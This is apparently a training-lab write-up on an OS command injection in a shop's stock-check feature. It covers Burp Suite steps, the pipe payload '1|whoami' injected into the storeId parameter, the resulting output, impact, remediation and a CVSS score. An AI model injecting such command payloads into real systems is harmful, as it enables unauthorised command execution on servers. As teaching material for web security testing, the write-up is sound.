# OS command injection, simple case

## Description
The stock check functionality is vulnerable to OS command injection. User-supplied input from the `storeId` parameter is passed directly to an operating system command without proper validation, allowing arbitrary command execution on the server.

## Steps to Exploit
1. Navigate to a product page and click **Check Stock**.
2. Intercept the request to `/product/stock` using Burp Suite.
3. Locate the `storeId` parameter.
4. Replace its value with:
   ```bash
   1|whoami
   ```
5. Forward the request.
6. Observe that the response contains the output of the `whoami` command.

## Proof of Concept

### Payload
```bash
1|whoami
```

### Injected Command
```bash
stockreport.pl 1|whoami
```

### Response Output
```text
peter-xxxxxx
```

## Impact
- Arbitrary command execution on the server.
- Access to sensitive files and credentials.
- Potential lateral movement within the internal network.
- Complete compromise of confidentiality, integrity, and availability.

## Remediation
1. Avoid passing user-controlled input to OS shell commands.
2. Use allowlists for accepted parameter values.
3. Run the application with least-privilege permissions.
4. Implement input validation and monitoring for command injection attempts.

## CVSS Score
**CVSS v3.1: 9.8 (Critical)**

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

## CVSS Justification
- **Attack Vector:** Network – exploitable via HTTP requests.
- **Attack Complexity:** Low – requires a simple payload.
- **Privileges Required:** None.
- **User Interaction:** None.
- **Confidentiality:** High – access to sensitive data and files.
- **Integrity:** High – attacker can execute arbitrary commands.
- **Availability:** High – attacker can disrupt or disable services.